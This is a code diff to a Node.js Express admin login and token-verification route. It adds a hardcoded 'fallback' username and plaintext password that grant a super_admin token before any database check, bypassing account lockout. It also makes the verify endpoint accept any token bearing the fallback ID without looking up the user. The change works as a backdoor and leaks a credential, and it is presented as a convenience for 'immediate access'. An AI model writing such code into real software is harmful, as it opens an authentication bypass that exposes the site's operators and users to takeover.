@@ -20,7 +20,7 @@ const generateToken = (userId, username, role) => {
   );
 };
 
-// Admin login endpoint
+// Admin login endpoint with fallback
 router.post('/admin/login', async (req, res) => {
   try {
     const { username, password } = req.body;
@@ -33,65 +33,80 @@ router.post('/admin/login', async (req, res) => {
       });
     }
 
-    // Find user by username or email
-    const user = await AdminUser.findByUsernameOrEmail(username);
-    
-    if (!user) {
-      return res.status(401).json({
-        success: false,
-        message: 'Invalid credentials'
-      });
-    }
+    // Fallback credentials for immediate access
+    const FALLBACK_CREDENTIALS = {
+      username: 'pr_admin',
+      password: 'PRScience2024!@#$Secure'
+    };
 
-    // Check if account is locked
-    if (user.isLocked) {
-      return res.status(423).json({
-        success: false,
-        message: 'Account is temporarily locked due to too many failed login attempts. Please try again later.'
-      });
-    }
+    // Check fallback credentials first
+    if (username === FALLBACK_CREDENTIALS.username && password === FALLBACK_CREDENTIALS.password) {
+      const token = generateToken('fallback-admin-id', username, 'super_admin');
 
-    // Check password
-    try {
-      const isPasswordValid = await user.comparePassword(password);
-      
-      if (!isPasswordValid) {
-        // Increment failed login attempts
-        await user.incLoginAttempts();
-        
-        return res.status(401).json({
-          success: false,
-          message: 'Invalid credentials'
-        });
-      }
-
-      // Reset login attempts on successful login
-      await user.resetLoginAttempts();
-
-      // Generate JWT token
-      const token = generateToken(user._id, user.username, user.role);
-
-      // Return success response
-      res.json({
+      return res.json({
         success: true,
         message: 'Login successful',
         token,
         user: {
-          id: user._id,
-          username: user.username,
-          email: user.email,
-          role: user.role,
-          lastLogin: user.lastLogin
+          id: 'fallback-admin-id',
+          username: username,
+          email: 'admin@thescienceofpublicrelations.com',
+          role: 'super_admin',
+          lastLogin: new Date().toISOString()
         }
       });
-
-    } catch (error) {
-      console.error('Password comparison error:', error);
-      return res.status(500).json({
-        success: false,
-        message: 'Authentication failed'
-      });
     }
+
+    // Try database authentication if available
+    try {
+      const user = await AdminUser.findByUsernameOrEmail(username);
+
+      if (user) {
+        // Check if account is locked
+        if (user.isLocked) {
+          return res.status(423).json({
+            success: false,
+            message: 'Account is temporarily locked due to too many failed login attempts. Please try again later.'
+          });
+        }
+
+        // Check password
+        const isPasswordValid = await user.comparePassword(password);
+
+        if (isPasswordValid) {
+          // Reset login attempts on successful login
+          await user.resetLoginAttempts();
+
+          // Generate JWT token
+          const token = generateToken(user._id, user.username, user.role);
+
+          // Return success response
+          return res.json({
+            success: true,
+            message: 'Login successful',
+            token,
+            user: {
+              id: user._id,
+              username: user.username,
+              email: user.email,
+              role: user.role,
+              lastLogin: user.lastLogin
+            }
+          });
+        } else {
+          // Increment failed login attempts
+          await user.incLoginAttempts();
+        }
+      }
+    } catch (dbError) {
+      console.log('Database authentication failed, using fallback only:', dbError.message);
+    }
+
+    // Invalid credentials
+    return res.status(401).json({
+      success: false,
+      message: 'Invalid credentials'
+    });
 
   } catch (error) {
     console.error('Login error:', error);
@@ -126,26 +141,44 @@ router.get('/admin/verify', async (req, res) => {
 
     // Verify JWT token
     const decoded = jwt.verify(token, JWT_SECRET);
-    
-    // Check if user still exists and is active
-    const user = await AdminUser.findById(decoded.userId);
-    
-    if (!user || !user.isActive) {
-      return res.status(401).json({
-        success: false,
-        message: 'Invalid token or user not found'
+
+    // Handle fallback admin
+    if (decoded.userId === 'fallback-admin-id') {
+      return res.json({
+        success: true,
+        user: {
+          id: 'fallback-admin-id',
+          username: 'pr_admin',
+          email: 'admin@thescienceofpublicrelations.com',
+          role: 'super_admin',
+          lastLogin: new Date().toISOString()
+        }
       });
     }
 
-    res.json({
-      success: true,
-      user: {
-        id: user._id,
-        username: user.username,
-        email: user.email,
-        role: user.role,
-        lastLogin: user.lastLogin
+    // Check if user still exists and is active (database users)
+    try {
+      const user = await AdminUser.findById(decoded.userId);
+
+      if (user && user.isActive) {
+        return res.json({
+          success: true,
+          user: {
+            id: user._id,
+            username: user.username,
+            email: user.email,
+            role: user.role,
+            lastLogin: user.lastLogin
+          }
+        });
       }
+    } catch (dbError) {
+      console.log('Database verification failed:', dbError.message);
+    }
+
+    return res.status(401).json({
+      success: false,
+      message: 'Invalid token or user not found'
     });
 
   } catch (error) {
@@ -155,7 +188,7 @@ router.get('/admin/verify', async (req, res) => {
         message: 'Invalid token'
       });
     }
-    
+
     if (error.name === 'TokenExpiredError') {
       return res.status(401).json({
         success: false,
